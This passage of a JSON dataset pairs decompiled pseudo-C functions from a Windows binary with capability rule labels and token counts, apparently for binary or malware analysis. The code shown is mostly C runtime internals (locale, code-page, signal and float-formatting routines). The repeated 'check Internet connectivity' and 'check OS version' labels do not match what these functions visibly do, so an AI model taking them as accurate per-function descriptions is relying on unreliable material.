        "decompiled_code": "\nvoid __cdecl fcn.004243dc(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_7ch;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    iVar1 = (**0x450c00)(arg_8h & 0x3ff | 0x400, 1, &var_7ch, 0x78);\n    if (((iVar1 != 0) && (uVar2 = fcn.004242f6(),  arg_8h != uVar2)) && (arg_ch != 0)) {\n        fcn.004196b0(*0x450bfc);\n        fcn.0042432b();\n    }\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 189
    },
    "00424667": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424667(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint var_7ch;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    arg_8h_00 = fcn.004242f6();\n    iVar1 = (**0x450c00)(arg_8h_00, (-(*0x450bec != 0) & 0xfffff002) + 0x1001, &var_7ch, 0x78);\n    if (iVar1 == 0) {\n        *0x450be0 = 0;\n        goto code_r0x00424725;\n    }\n    iVar1 = fcn.00425f25(*0x450bfc, &var_7ch);\n    if (iVar1 == 0) {\n        if (*0x450bec == 0) {\n            iVar1 = 1;\n            goto code_r0x004246f9;\n        }\n    }\n    else {\n        if (((*0x450bec != 0) || (*0x450bf8 == 0)) ||\n           (iVar1 = fcn.00425f8e(*0x450bfc, &var_7ch, *0x450bf8),  iVar1 != 0)) goto code_r0x00424725;\ncode_r0x004246f9:\n        iVar1 = fcn.004243dc(arg_8h_00, iVar1);\n        if (iVar1 == 0) goto code_r0x00424725;\n    }\n    *0x450be0 = *0x450be0 | 4;\n    *0x450be4 = arg_8h_00;\n    *0x450be8 = arg_8h_00;\ncode_r0x00424725:\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 424
    },
    "00424844": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.00424844(char *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    uint uVar2;\n    int16_t *unaff_EBX;\n    int32_t unaff_retaddr;\n    \n    if (*0x450c00 == NULL) {\n        if (*0x450784 == 2) {\n            *0x450c00 = _sym.imp.KERNEL32.dll_GetLocaleInfoA;\n        }\n        else {\n            *0x450c00 = fcn.00424213;\n        }\n    }\n    if (param_1 == NULL) {\ncode_r0x0042491e:\n        fcn.00424165();\ncode_r0x00424923:\n        if (*0x450be0 == 0) {\n            return 0;\n        }\n    }\n    else {\n        *0x450bf4 = param_1 + 0x40;\n        *0x450bfc = param_1;\n        if ((*0x450bf4 != NULL) && (**0x450bf4 != '\\0')) {\n            fcn.00424105(0x443300, 0x16, 0x450bf4);\n        }\n        *0x450be0 = 0;\n        if ((*0x450bfc == NULL) || (**0x450bfc == '\\0')) {\n            if ((*0x450bf4 == NULL) || (**0x450bf4 == '\\0')) goto code_r0x0042491e;\n            fcn.00424732();\n            goto code_r0x00424923;\n        }\n        if ((*0x450bf4 == NULL) || (**0x450bf4 == '\\0')) {\n            fcn.004247ef();\n        }\n        else {\n            fcn.00424769();\n        }\n        if (*0x450be0 == 0) {\n            iVar1 = fcn.00424105(0x4434b0, 0x40, 0x450bfc);\n            if (iVar1 != 0) {\n                if ((*0x450bf4 == NULL) || (**0x450bf4 == '\\0')) {\n                    fcn.004247ef();\n                }\n                else {\n                    fcn.00424769();\n                }\n            }\n            goto code_r0x00424923;\n        }\n    }\n    arg_8h = fcn.0042417f();\n    if (((arg_8h == 0) || (iVar1 = (*_sym.imp.KERNEL32.dll_IsValidCodePage)(arg_8h & 0xffff),  iVar1 == 0)) ||\n       (iVar1 = (*_sym.imp.KERNEL32.dll_IsValidLocale)(*0x450be4, 1),  uVar2 = *0x450be4,  iVar1 == 0)) {\ncode_r0x004249f3:\n        uVar2 = 0;\n    }\n    else {\n        if (unaff_EBX != NULL) {\n            *unaff_EBX = *0x450be4;\n            unaff_EBX[1] = *0x450be8;\n            unaff_EBX[2] = arg_8h;\n        }\n        if (unaff_retaddr != 0) {\n            if (*unaff_EBX == 0x814) {\n                fcn.004200e0(unaff_retaddr, \"Norwegian-Nynorsk\");\n            }\n            else {\n                iVar1 = (**0x450c00)(uVar2, 0x1001, unaff_retaddr, 0x40);\n                if (iVar1 == 0) goto code_r0x004249f3;\n            }\n            iVar1 = (**0x450c00)(*0x450be8, 0x1002, unaff_retaddr + 0x40, 0x40);\n            if (iVar1 == 0) goto code_r0x004249f3;\n            fcn.0041a78c(arg_8h, unaff_retaddr + 0x80, 10);\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 902
    },
    "00424a3c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl\nfcn.00424a3c(uint noname_0, uint noname_1, uint lpMultiByteStr, uint arg_14h_2, uint arg_8h, uint arg_ch, uint noname_6\n            , uint arg_14h)\n\n{\n    uchar *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uchar *arg_ch_00;\n    uint *arg_8h_00;\n    int32_t unaff_EBP;\n    uint CodePage;\n    uint var_4h;\n    uint var_48h_2;\n    uint var_54h;\n    uint cbMultiByte;\n    uint var_3ch_2;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uint var_4h_2;\n    uint uStack4;\n    \n    uStack4 = 0x38;\n    var_4h_2 = 0x443ae8;\n    var_18h = 0x424a48;\n    fcn.00419d14();\n    *(unaff_EBP + -0x1c) = *0x44d270;\n    *(unaff_EBP + -0x34) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    puVar1 = **(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x40) = puVar1;\n    *(unaff_EBP + -0x3c) = 0;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetCPInfo;\n    if (*(unaff_EBP + 8) == *(unaff_EBP + 0xc)) {\n        arg_8h_00 = *(unaff_EBP + -0x48);\n    }\n    else {\n        var_18h = unaff_EBP + -0x30;\n        var_1ch = *(unaff_EBP + 8);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n        if ((((iVar3 != 0) && (*(unaff_EBP + -0x30) == 1)) &&\n            (iVar3 = (*pcVar2)(*(unaff_EBP + 0xc), unaff_EBP + -0x30),  iVar3 != 0)) && (*(unaff_EBP + -0x30) == 1)) {\n            *(unaff_EBP + -0x3c) = 1;\n        }\n        if (*(unaff_EBP + -0x3c) == 0) {\n            arg_ch_00 = *(unaff_EBP + -0x38);\n        }\n        else {\n            arg_ch_00 = puVar1;\n            if (puVar1 == 0xffffffff) {\n                iVar3 = fcn.004196b0(*(unaff_EBP + 0x10));\n                arg_ch_00 = iVar3 + 1;\n            }\n            *(unaff_EBP + -0x38) = arg_ch_00;\n        }\n        if (*(unaff_EBP + -0x3c) == 0) {\n            arg_ch_00 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                  (*(unaff_EBP + 8), 1, *(unaff_EBP + 0x10), puVar1, 0, 0);\n            *(unaff_EBP + -0x38) = arg_ch_00;\n            if (arg_ch_00 == NULL) goto code_r0x00424bf4;\n        }\n        arg_8h_00 = &fcn.00424a3c::var_1ch;\n        *(unaff_EBP + -4) = 0;\n        fcn.00418b80();\n        *(unaff_EBP + -0x18) = &fcn.00424a3c::var_1ch;\n        *(unaff_EBP + -0x48) = &fcn.00424a3c::var_1ch;\n        fcn.004192e0(&fcn.00424a3c::var_1ch, 0, arg_ch_00 * 2);\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*0x10 == 0x10) {\n            arg_8h_00 = fcn.0041ac0c(2, arg_ch_00);\n            if (arg_8h_00 == NULL) goto code_r0x00424bf4;\n            *(unaff_EBP + -0x44) = 1;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                          (*(unaff_EBP + 8), 1, *(unaff_EBP + 0x10), *(unaff_EBP + -0x40), arg_8h_00, arg_ch_00);\n        if (iVar3 != 0) {\n            if (*(unaff_EBP + 0x18) == 0) {\n                if (*(unaff_EBP + -0x3c) == 0) {\n                    var_18h = NULL;\n                    var_1ch = 0;\n                    arg_ch_00 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                          (*(unaff_EBP + 0xc), 0, arg_8h_00, arg_ch_00, 0, 0);\n                    if (arg_ch_00 == NULL) goto code_r0x00424be5;\n                }\n                var_1ch = 1;\n                var_18h = arg_ch_00;\n                iVar3 = fcn.0041ac0c(1, arg_ch_00);\n                *(unaff_EBP + -0x34) = iVar3;\n                if (iVar3 != 0) {\n                    var_18h = NULL;\n                    var_1ch = 0;\n                    iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                      (*(unaff_EBP + 0xc), 0, arg_8h_00, arg_ch_00, iVar3, arg_ch_00);\n                    if (iVar3 == 0) {\n                        var_18h = *(unaff_EBP + -0x34);\n                        var_1ch = 0x424bcf;\n                        fcn.00418911(var_18h);\n                        *(unaff_EBP + -0x34) = 0;\n                    }\n                    else if (*(unaff_EBP + -0x40) != -1) {\n                        **(unaff_EBP + 0x14) = iVar3;\n                    }\n                }\n            }\n            else {\n                var_18h = NULL;\n                var_1ch = 0;\n                iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                  (*(unaff_EBP + 0xc), 0, arg_8h_00, arg_ch_00, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c)\n                                  );\n                if (iVar3 != 0) {\n                    *(unaff_EBP + -0x34) = *(unaff_EBP + 0x18);\n                }\n            }\n        }\n    }\ncode_r0x00424be5:\n    if (*(unaff_EBP + -0x44) != 0) {\n        var_1ch = 0x424bf0;\n        var_18h = arg_8h_00;\n        fcn.00418911(arg_8h_00);\n    }\ncode_r0x00424bf4:\n    *(unaff_EBP + -0x58) = 0x424bff;\n    fcn.004192ca();\n    *(unaff_EBP + -0x58) = 0x424c04;\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 1853
    },
    "00424c33": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00424c33(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *extraout_ECX;\n    code *arg_8h_00;\n    int32_t unaff_EBP;\n    code **ppcVar4;\n    code *pcVar5;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00419d14(0x443af8, 0x20);\n    *(unaff_EBP + -0x1c) = 0;\n    iVar1 = *(unaff_EBP + 8);\n    if (iVar1 == 2) {\n        ppcVar4 = 0x450c28;\n        pcVar5 = *0x450c28;\ncode_r0x00424cc0:\n        *(unaff_EBP + -0x1c) = 1;\n        iVar1 = *(unaff_EBP + -0x24);\n    }\n    else {\n        if (((iVar1 != 4) && (iVar1 != 8)) && (iVar1 != 0xb)) {\n            if (iVar1 == 0xf) {\n                ppcVar4 = 0x450c34;\n                pcVar5 = *0x450c34;\n            }\n            else if (iVar1 == 0x15) {\n                ppcVar4 = 0x450c2c;\n                pcVar5 = *0x450c2c;\n            }\n            else {\n                if (iVar1 != 0x16) goto code_r0x00424da6;\n                ppcVar4 = 0x450c30;\n                pcVar5 = *0x450c30;\n            }\n            goto code_r0x00424cc0;\n        }\n        iVar1 = fcn.0041b5aa();\n        *(unaff_EBP + -0x24) = iVar1;\n        iVar2 = fcn.00424c05();\n        ppcVar4 = iVar2 + 8;\n        pcVar5 = *ppcVar4;\n    }\n    arg_8h_00 = NULL;\n    *(unaff_EBP + -0x20) = pcVar5;\n    if (pcVar5 == 0x1) goto code_r0x00424da6;\n    if (pcVar5 == NULL) {\n        fcn.00419a7b(3);\n        arg_8h_00 = extraout_ECX;\n    }\n    if (*(unaff_EBP + -0x1c) != arg_8h_00) {\n        fcn.0041c713(arg_8h_00);\n        arg_8h_00 = NULL;\n    }\n    *(unaff_EBP + -4) = arg_8h_00;\n    iVar2 = *(unaff_EBP + 8);\n    if (((iVar2 == 8) || (iVar2 == 0xb)) || (iVar2 == 4)) {\n        *(unaff_EBP + -0x2c) = *(iVar1 + 0x58);\n        *(iVar1 + 0x58) = arg_8h_00;\n        if (iVar2 == 8) {\n            *(unaff_EBP + -0x30) = *(iVar1 + 0x5c);\n            *(iVar1 + 0x5c) = 0x8c;\n            goto code_r0x00424d1f;\n        }\ncode_r0x00424d4b:\n        *ppcVar4 = arg_8h_00;\n    }\n    else {\ncode_r0x00424d1f:\n        iVar3 = *0x44da90;\n        if (iVar2 != 8) goto code_r0x00424d4b;\n        for (; *(unaff_EBP + -0x28) = iVar3,  iVar3 < *0x44da94 + *0x44da90; iVar3 = iVar3 + 1) {\n            *(*(iVar1 + 0x54) + 8 + iVar3 * 0xc) = arg_8h_00;\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00424d6e();\n    if (*(unaff_EBP + 8) == 8) {\n        (*pcVar5)(8, *(iVar1 + 0x5c));\n    }\n    else {\n        (*pcVar5)(*(unaff_EBP + 8));\n    }\n    iVar2 = *(unaff_EBP + 8);\n    if ((((iVar2 == 8) || (iVar2 == 0xb)) || (iVar2 == 4)) && (*(iVar1 + 0x58) = *(unaff_EBP + -0x2c),  iVar2 == 8)) {\n        *(iVar1 + 0x5c) = *(unaff_EBP + -0x30);\n    }\ncode_r0x00424da6:\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 1164
    },
    "00424dac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00424dac(uint32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint uVar5;\n    \n    if (param_1 < *0x450e88) {\n        piVar1 = (param_1 >> 5) * 4 + 0x450ea0;\n        iVar4 = (param_1 & 0x1f) * 0x24;\n        piVar2 = *piVar1 + iVar4;\n        if (((*(piVar2 + 1) & 1) != 0) && (*piVar2 != -1)) {\n            if (*0x44d26c == 1) {\n                if (param_1 == 0) {\n                    uVar5 = 0xfffffff6;\n                }\n                else if (param_1 == 1) {\n                    uVar5 = 0xfffffff5;\n                }\n                else {\n                    if (param_1 != 2) goto code_r0x00424e08;\n                    uVar5 = 0xfffffff4;\n                }\n                (*_sym.imp.KERNEL32.dll_SetStdHandle)(uVar5, 0);\n            }\ncode_r0x00424e08:\n            *(iVar4 + *piVar1) = 0xffffffff;\n            return 0;\n        }\n    }\n    puVar3 = fcn.0041a92a();\n    *puVar3 = 9;\n    puVar3 = fcn.0041a933();\n    *puVar3 = 0;\n    return 0xffffffff;\n}\n",
        "token_count": 363
    },
    "0042510c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042510c(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00419d14(0x443b38, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x450e88) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x450ea0;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.00424e6c(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\ncode_r0x0042518c:\n                puVar3 = fcn.0041a92a();\n                *puVar3 = 9;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.00424e2b(arg_8h_00);\n                iVar4 = (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(uVar2);\n                if (iVar4 == 0) {\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    *(unaff_EBP + -0x1c) = uVar2;\n                }\n                else {\n                    *(unaff_EBP + -0x1c) = 0;\n                }\n                if (*(unaff_EBP + -0x1c) != 0) {\n                    puVar3 = fcn.0041a933();\n                    *puVar3 = *(unaff_EBP + -0x1c);\n                    goto code_r0x0042518c;\n                }\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.004251ac();\n            goto code_r0x004251c2;\n        }\n    }\n    puVar3 = fcn.0041a92a();\n    *puVar3 = 9;\ncode_r0x004251c2:\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 592
    },
    "004251c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004251c8(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    \n    iVar1 = fcn.0041b5aa();\n    iVar1 = *(iVar1 + 0x60);\n    if (iVar1 != *0x451fe8) {\n        iVar1 = fcn.0041a0ec();\n    }\n    if (arg_10h == 0) {\n        return 0;\n    }\n    iVar1 = fcn.00426172(*(iVar1 + 0xc), 1, arg_8h, arg_10h, arg_ch, arg_10h, *(iVar1 + 4), unaff_EBP, unaff_retaddr, \n                         arg_8h, arg_ch, arg_10h, in_stack_00000010, in_stack_00000014, in_stack_00000018, \n                         in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c, \n                         in_stack_00000030, in_stack_00000034, in_stack_00000038, in_stack_0000003c, in_stack_00000040, \n                         in_stack_00000044, in_stack_00000048, in_stack_0000004c, in_stack_00000050);\n    if (iVar1 == 0) {\n        return 0x7fffffff;\n    }\n    return iVar1 + -2;\n}\n",
        "token_count": 514
    },
    "0042545e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00425734)\n// WARNING: Removing unreachable block (ram,0x004256ae)\n// WARNING: Removing unreachable block (ram,0x00425810)\n// WARNING: Removing unreachable block (ram,0x004256c0)\n// WARNING: Removing unreachable block (ram,0x004256c8)\n// WARNING: Removing unreachable block (ram,0x004256ce)\n// WARNING: Removing unreachable block (ram,0x004256d1)\n// WARNING: Removing unreachable block (ram,0x004256d8)\n// WARNING: Removing unreachable block (ram,0x004256e2)\n// WARNING: Removing unreachable block (ram,0x004257ac)\n// WARNING: Removing unreachable block (ram,0x004257a6)\n// WARNING: Removing unreachable block (ram,0x004257b2)\n// WARNING: Removing unreachable block (ram,0x004257cf)\n// WARNING: Removing unreachable block (ram,0x004257d1)\n// WARNING: Removing unreachable block (ram,0x004257d9)\n// WARNING: Removing unreachable block (ram,0x004257dc)\n// WARNING: Removing unreachable block (ram,0x004257e1)\n// WARNING: Removing unreachable block (ram,0x004257e4)\n// WARNING: Removing unreachable block (ram,0x00425819)\n// WARNING: Removing unreachable block (ram,0x004257eb)\n// WARNING: Removing unreachable block (ram,0x004257f2)\n// WARNING: Removing unreachable block (ram,0x00425830)\n// WARNING: Removing unreachable block (ram,0x00425837)\n// WARNING: Removing unreachable block (ram,0x0042583f)\n\nvoid __cdecl\nfcn.0042545e(uint arg_8h, uint arg_ch, char *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_19h;\n    uint var_14h;\n    uint var_eh;\n    uint var_ah;\n    uint var_4h;\n    \n    for (; (((cVar1 = *arg_10h,  cVar1 == ' ' || (cVar1 == '\\t')) || (cVar1 == '\\n')) || (cVar1 == '\\r'));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x004254c1. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x425862\n    (**0x425862)();\n    return;\n}\n",
        "token_count": 675
    },
    "00425892": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00425892(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, uint32_t arg_18h, int16_t *arg_1ch)\n\n{\n    int16_t *piVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    int16_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int16_t *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint uStack40;\n    uint uStack36;\n    uint var_1ch;\n    uchar var_18h;\n    uchar var_17h;\n    uchar var_16h;\n    uchar var_15h;\n    uchar var_14h;\n    uchar var_13h;\n    uchar var_12h;\n    uchar var_11h;\n    ushort var_10h;\n    uint var_eh;\n    uint32_t var_ah;\n    uchar var_6h;\n    char var_5h;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    uVar3 = arg_10h & 0x7fff;\n    var_1ch._0_1_ = 0xcc;\n    var_1ch._1_1_ = 0xcc;\n    var_1ch._2_1_ = 0xcc;\n    var_1ch._3_1_ = 0xcc;\n    var_18h = 0xcc;\n    var_17h = 0xcc;\n    var_16h = 0xcc;\n    var_15h = 0xcc;\n    var_14h = 0xcc;\n    var_13h = 0xcc;\n    var_12h = 0xfb;\n    var_11h = 0x3f;\n    if ((arg_10h & 0x8000) == 0) {\n        *(arg_1ch + 1) = 0x20;\n    }\n    else {\n        *(arg_1ch + 1) = 0x2d;\n    }\n    if (((uVar3 == 0) && (arg_ch == 0)) && (arg_8h == 0)) {\ncode_r0x00425a08:\n        *(arg_1ch + 2) = 0x30;\ncode_r0x00425b0b:\n        *arg_1ch = 0;\n        *(arg_1ch + 1) = 0x20;\n        *(arg_1ch + 3) = 1;\n        *(arg_1ch + 5) = 0;\n    }\n    else {\n        if (uVar3 == 0x7fff) {\n            *arg_1ch = 1;\n            if (((arg_ch == 0x80000000) && (arg_8h == 0)) || ((arg_ch & 0x40000000) != 0)) {\n                if (((arg_10h & 0x8000) == 0) || (arg_ch != 0xc0000000)) {\n                    if ((arg_ch != 0x80000000) || (arg_8h != 0)) goto code_r0x0042597e;\n                    pcVar8 = \"1#INF\";\n                }\n                else {\n                    if (arg_8h != 0) {\ncode_r0x0042597e:\n                        pcVar8 = \"1#QNAN\";\n                        goto code_r0x00425983;\n                    }\n                    pcVar8 = \"1#IND\";\n                }\n                fcn.004200e0(arg_1ch + 2, pcVar8);\n                *(arg_1ch + 3) = 5;\n            }\n            else {\n                pcVar8 = \"1#SNAN\";\ncode_r0x00425983:\n                fcn.004200e0(arg_1ch + 2, pcVar8);\n                *(arg_1ch + 3) = 6;\n            }\n            goto code_r0x00425aed;\n        }\n        var_10h = 0;\n        iVar6 = ((uVar3 >> 8) + (arg_ch >> 0x18) * 2) * 0x4d + -0x134312f4 + uVar3 * 0x4d10 >> 0x10;\n        var_6h = uVar3;\n        var_5h = uVar3 >> 8;\n        var_eh = arg_8h;\n        var_ah = arg_ch;\n        fcn.004269ab(&var_10h, -iVar6, 1);\n        if (0x3ffe < CONCAT11(var_5h, var_6h)) {\n            iVar6 = iVar6 + 1;\n            fcn.00426779(&var_10h, &var_1ch);\n        }\n        *arg_1ch = iVar6;\n        if (((arg_18h & 1) != 0) && (arg_14h = arg_14h + iVar6,  arg_14h < 1)) goto code_r0x00425a08;\n        if (0x15 < arg_14h) {\n            arg_14h = 0x15;\n        }\n        iVar7 = CONCAT11(var_5h, var_6h) - 0x3ffe;\n        var_6h = 0;\n        var_5h = '\\0';\n        arg_10h = 8;\n        do {\n            fcn.00425325(&var_10h);\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n        if (iVar7 < 0) {\n            for (uVar3 = -iVar7 & 0xff; uVar3 != 0; uVar3 = uVar3 - 1) {\n                fcn.00425353(&var_10h);\n            }\n        }\n        arg_10h = arg_14h + 1;\n        piVar4 = arg_1ch + 2;\n        var_30h = piVar4;\n        if (0 < arg_10h) {\n            do {\n                var_ah._2_2_ = var_ah >> 0x10;\n                var_eh._2_2_ = var_eh >> 0x10;\n                var_28h = CONCAT22(var_eh, var_10h);\n                uStack40 = CONCAT22(var_ah, var_eh._2_2_);\n                uStack36 = CONCAT13(var_5h, CONCAT12(var_6h, var_ah._2_2_));\n                fcn.00425325(&var_10h);\n                fcn.00425325(&var_10h);\n                fcn.004252c7(&var_10h, &var_28h);\n                fcn.00425325(&var_10h);\n                piVar4 = var_30h + 1;\n                arg_10h = arg_10h + -1;\n                *var_30h = var_5h + '0';\n                var_5h = '\\0';\n                var_30h = piVar4;\n            } while (arg_10h != 0);\n        }\n        piVar5 = piVar4 + -1;\n        piVar1 = arg_1ch + 2;\n        if (*(piVar4 + -1) < '5') {\n            for (; (piVar1 <= piVar5 && (*piVar5 == '0')); piVar5 = piVar5 + -1) {\n            }\n            if (piVar5 < piVar1) {\n                *piVar1 = 0x30;\n                goto code_r0x00425b0b;\n            }\n        }\n        else {\n            for (; (piVar1 <= piVar5 && (*piVar5 == '9')); piVar5 = piVar5 + -1) {\n                *piVar5 = 0x30;\n            }\n            if (piVar5 < piVar1) {\n                piVar5 = piVar5 + 1;\n                *arg_1ch = *arg_1ch + 1;\n            }\n            *piVar5 = *piVar5 + '\\x01';\n        }\n        cVar2 = (piVar5 - arg_1ch) + -3;\n        *(arg_1ch + 3) = cVar2;\n        *(cVar2 + 4 + arg_1ch) = 0;\n    }\ncode_r0x00425aed:\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 1927
    },
    "00425b20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpBuffer\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00425b20(uint32_t arg_8h, char *arg_ch, char *nNumberOfBytesToRead)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    char *pcVar8;\n    int32_t iVar9;\n    int32_t lpNumberOfBytesRead;\n    char *var_8h;\n    uint lpBuffer;\n    \n    var_8h = NULL;\n    if (nNumberOfBytesToRead != NULL) {\n        piVar1 = (arg_8h >> 5) * 4 + 0x450ea0;\n        iVar9 = (arg_8h & 0x1f) * 0x24;\n        uVar3 = *(*piVar1 + iVar9 + 4);\n        if ((uVar3 & 2) == 0) {\n            pcVar8 = arg_ch;\n            if (((uVar3 & 0x48) != 0) && (*(*piVar1 + iVar9 + 5) != '\\n')) {\n                nNumberOfBytesToRead = nNumberOfBytesToRead + -1;\n                *arg_ch = *(*piVar1 + 5 + iVar9);\n                